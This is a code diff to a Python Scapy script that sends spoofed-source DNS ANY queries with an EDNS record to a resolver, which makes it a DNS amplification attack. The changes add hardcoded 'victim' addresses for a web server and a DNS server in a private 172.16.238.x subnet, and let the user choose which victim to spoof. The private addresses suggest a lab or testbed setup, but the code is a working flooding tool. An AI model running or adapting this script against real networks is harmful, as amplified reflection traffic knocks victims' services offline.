@@ -7,15 +7,21 @@ from multiprocessing import Process
 import sys
 import signal
 
+WEB_VICTIM_IP = "172.16.238.100"
+DNS_VICTIM_IP = "172.16.238.101"
+
+attack_web = sys.argv[1] == "web"
+
 try:
-    number_processes = int(sys.argv[1])
-    dns_ip = sys.argv[2]
+    spoof_ip = WEB_VICTIM_IP if attack_web else DNS_VICTIM_IP
+    number_processes = int(sys.argv[2])
+    dns_ip = sys.argv[3]
 except:
+    spoof_ip = WEB_VICTIM_IP
     number_processes = 2
     dns_ip = 8
 
 destination_ip = "172.16.238.{}".format(dns_ip)
-spoof_ip = "172.16.238.10"
 
 conf.verb = 0
 
@@ -23,7 +29,7 @@ conf.verb = 0
 def attack():
     request = (
             IP(src=spoof_ip, dst=destination_ip) /
-            UDP(dport=53, sport=RandShort()) /
+            UDP(dport=53, sport=RandShort() if attack_web else 53) /
             DNS(id=RandShort(), rd=1, qdcount=1, cd=1, qd=DNSQR(qname="example.com", qtype=255, qclass=1),
                 ar=DNSRROPT(rclass=65527, rdlen=0)
                 )
